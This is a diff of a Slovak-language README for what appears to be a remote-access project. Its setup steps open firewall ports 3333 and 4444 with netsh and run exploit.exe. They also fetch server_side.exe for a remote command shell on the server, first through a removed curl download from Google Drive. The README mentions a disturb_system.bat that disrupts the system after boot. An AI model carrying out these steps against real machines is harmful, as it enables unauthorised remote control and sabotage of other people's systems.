@@ -36,9 +36,8 @@ V tejto zlozke su zdrojove kody pre sifrovanu komunikaciu v zlozke `communicatio
     -   `netsh advfirewall firewall add rule name="Allow port 3333" dir=in action=allow protocol=TCP localport=3333`
     -   `netsh advfirewall firewall add rule name="Allow p****ort 4444" dir=in action=allow protocol=TCP localport=4444`
 - dalej je potrebne spustit CertificateAuthority.exe v novom terminaly z administrativnimy pravami
-- v terminaly kde je spusteny exploit.exe je potrebne stiahnut subor server_side.exe
-    -   `curl -L -o server_side.exe "https://drive.google.com/uc?export=download&id=1MWQaEGF5sdziP5qQR7zLXzuNJT_CAgcj"` 
-- tento subor nasledovne stiahneme z prikazom server_side.exe *[ip_adresa_certifikacne_autority]* *[ip_adresa_klienta]*
+- v terminaly kde je spusteny exploit.exe je potrebne stiahnut subor `server_side.exe` na stranu servera prikaz na stiahnutie je v subore `commands_list.txt`
+- tento subor nasledovne stiahneme z prikazom `server_side.exe [ip_adresa_certifikacne_autority] [ip_adresa_klienta]`
 - potom spustime na klientovy subor client_side.exe a zvolime ip adresu CA *(localhost v tomto pripade)* a serveru
 - ak vsetko prebehlo ako malu virtualne cmd je inicializovane a je mozne sa pohybovat v adresarovej strukture servera a zadavat prikazy a ziskat aj output tychto prikazov
 - dalej je mozne si stiahnut subor `disturb_system.bat` pomocou prikazu v `commands_list.txt` ktory rusit beh systemu po starte
